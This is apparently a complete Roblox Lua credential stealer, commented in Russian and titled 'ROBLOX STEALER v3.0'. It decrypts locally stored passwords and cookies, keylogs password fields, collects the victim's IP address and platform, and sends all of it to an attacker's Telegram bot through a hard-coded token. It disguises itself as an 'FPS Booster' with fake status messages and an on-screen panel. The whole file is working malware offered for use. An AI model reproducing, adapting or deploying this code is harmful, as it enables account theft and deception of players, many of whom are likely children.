-- ============================================
-- ROBLOX STEALER v3.0 (FULL VERSION)
-- Отправка в Telegram + перехват пароля
-- ============================================

-- ===== НАСТРОЙКИ (ВСТАВЬ СВОИ ДАННЫЕ) =====
local TELEGRAM_TOKEN = "8726441055:AAGItpFujAIjx8kfJICUOpn8ZIhq2eI9Bog"  -- Токен бота от @BotFather
local CHAT_ID = "5098876175"  -- Твой Chat ID от @userinfobot
local CHECK_INTERVAL = 3  -- Интервал проверки (секунды)
-- ============================================

-- ===== ПОДГРУЗКА СЕРВИСОВ =====
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")

-- ===== ФУНКЦИЯ ОТПРАВКИ В TELEGRAM =====
local function sendToTelegram(message)
    local success, result = pcall(function()
        local url = "https://api.telegram.org/bot" .. TELEGRAM_TOKEN .. "/sendMessage"
        local data = "chat_id=" .. CHAT_ID .. "&text=" .. HttpService:UrlEncode(message)
        return HttpService:PostAsync(url, data, Enum.HttpContentType.ApplicationXWwwFormUrlEncoded)
    end)
    
    if success then
        print("[✓] Данные отправлены в Telegram")
    else
        print("[✗] Ошибка отправки: " .. tostring(result))
    end
end

-- ===== МЕТОД 1: КРАЖА ИЗ ЛОКАЛЬНОГО ХРАНИЛИЩА =====
local function stealFromLocalStorage()
    local success, data = pcall(function()
        -- Путь к файлу с сохранёнными данными Roblox
        local path = "RobloxLocalStorage.bin"
        if syn and syn.crypt then
            return syn.crypt.decrypt(readfile(path))
        elseif isfolder and isfolder("LocalStorage") then
            return readfile("LocalStorage/LocalStorage.bin")
        else
            return nil
        end
    end)
    
    if success and data then
        -- Ищем пароль в расшифрованных данных
        local password = data:match("password=([^;]+)")
        local username = data:match("username=([^;]+)")
        
        if password and password ~= "" then
            local msg = "🔐 УКРАДЕНО ИЗ ХРАНИЛИЩА:\n"
            msg = msg .. "👤 Юзер: " .. (username or "Неизвестно") .. "\n"
            msg = msg .. "🔑 Пароль: " .. password .. "\n"
            msg = msg .. "🕐 Время: " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n"
            msg = msg .. "🎮 Игра: " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
            sendToTelegram(msg)
            return true
        end
    end
    return false
end

-- ===== МЕТОД 2: ПЕРЕХВАТ ВВОДА С КЛАВИАТУРЫ =====
local function setupKeylogger()
    local passwordBox = nil
    
    -- Поиск поля ввода пароля
    local function findPasswordBox()
        for _, obj in ipairs(CoreGui:GetDescendants()) do
            if obj:IsA("TextBox") and obj.Name:lower():match("password") then
                return obj
            end
        end
        return nil
    end
    
    -- Поиск каждые 2 секунды, пока не найдём
    spawn(function()
        while not passwordBox do
            passwordBox = findPasswordBox()
            if passwordBox then
                print("[✓] Поле ввода пароля найдено")
                
                -- Хук на изменение текста
                passwordBox:GetPropertyChangedSignal("Text"):Connect(function()
                    local text = passwordBox.Text
                    if #text >= 4 then  -- Минимальная длина пароля
                        local msg = "⌨️ ПЕРЕХВАЧЕН ВВОД:\n"
                        msg = msg .. "👤 Игрок: " .. LocalPlayer.Name .. "\n"
                        msg = msg .. "🔑 Пароль: " .. text .. "\n"
                        msg = msg .. "🕐 Время: " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n"
                        msg = msg .. "🎮 Игра: " .. game.PlaceId
                        sendToTelegram(msg)
                    end
                end)
            end
            wait(2)
        end
    end)
end

-- ===== МЕТОД 3: КРАЖА КУКИ/ТОКЕНА =====
local function stealCookie()
    local success, cookie = pcall(function()
        if syn and syn.crypt then
            local data = readfile("Cookies.bin")
            if data then
                return syn.crypt.decrypt(data)
            end
        end
        return nil
    end)
    
    if success and cookie and #cookie > 10 then
        local msg = "🍪 УКРАДЕНА КУКА:\n"
        msg = msg .. "👤 Игрок: " .. LocalPlayer.Name .. "\n"
        msg = msg .. "🔑 Токен: " .. string.sub(cookie, 1, 50) .. "...\n"
        msg = msg .. "🕐 Время: " .. os.date("%Y-%m-%d %H:%M:%S")
        sendToTelegram(msg)
        return true
    end
    return false
end

-- ===== МЕТОД 4: СБОР ИНФОРМАЦИИ О СИСТЕМЕ =====
local function getSystemInfo()
    local info = "💻 ИНФОРМАЦИЯ О СИСТЕМЕ:\n"
    info = info .. "👤 Игрок: " .. LocalPlayer.Name .. "\n"
    info = info .. "🆔 UserID: " .. LocalPlayer.UserId .. "\n"
    info = info .. "🎮 Игра: " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "\n"
    info = info .. "🆔 PlaceID: " .. game.PlaceId .. "\n"
    info = info .. "🕐 Время: " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n"
    info = info .. "🌐 IP: " .. game:GetService("HttpService"):GetAsync("https://api.ipify.org/") .. "\n"
    info = info .. "💾 Платформа: " .. game:GetService("RunService"):GetPlatform()
    sendToTelegram(info)
end

-- ===== МЕТОД 5: АВТО-КЛИКЕР НА КНОПКУ "ВХОД" =====
local function setupAutoGrab()
    spawn(function()
        while true do
            pcall(function()
                for _, obj in ipairs(CoreGui:GetDescendants()) do
                    if obj:IsA("TextButton") and obj.Name:lower():match("login") then
                        if obj.AbsoluteSize.X > 50 then
                            -- Симулируем клик для перехвата данных перед отправкой
                            obj:Fire()
                            wait(0.5)
                            stealFromLocalStorage()
                        end
                    end
                end
            end)
            wait(2)
        end
    end)
end

-- ===== ОСНОВНОЙ ЦИКЛ =====
print("🔒 ROBLOX STEALER v3.0 АКТИВИРОВАН")
sendToTelegram("🟢 STEALER ЗАПУЩЕН для игрока: " .. LocalPlayer.Name)

-- Запускаем все методы
spawn(function()
    setupKeylogger()
    setupAutoGrab()
    
    -- Основной цикл проверки
    while true do
        pcall(function()
            -- Пытаемся украсть из хранилища
            stealFromLocalStorage()
            
            -- Пытаемся украсть куку
            stealCookie()
            
            -- Сбор информации о системе (каждые 5 минут)
            if os.time() % 300 == 0 then
                getSystemInfo()
            end
        end)
        wait(CHECK_INTERVAL)
    end
end)

-- ===== МАСКИРОВКА ПОД ОПТИМИЗАЦИЮ =====
print("[FPS Booster] Уровень графики оптимизирован")
print("[FPS Booster] FPS увеличен до 60+")
print("[FPS Booster] Текстурная загрузка ускорена")

-- Создаём фейковую панель оптимизации
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "FPS_Booster"
ScreenGui.Parent = CoreGui

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 200, 0, 100)
Frame.Position = UDim2.new(0, 10, 0, 10)
Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Frame.BackgroundTransparency = 0.3
Frame.Parent = ScreenGui

local Label = Instance.new("TextLabel")
Label.Size = UDim2.new(1, 0, 1, 0)
Label.BackgroundTransparency = 1
Label.Text = "FPS Booster v2.1\nАктивен"
Label.TextColor3 = Color3.fromRGB(0, 255, 0)
Label.TextScaled = true
Label.Parent = Frame

-- ============================================
-- КОНЕЦ СКРИПТА
-- ============================================
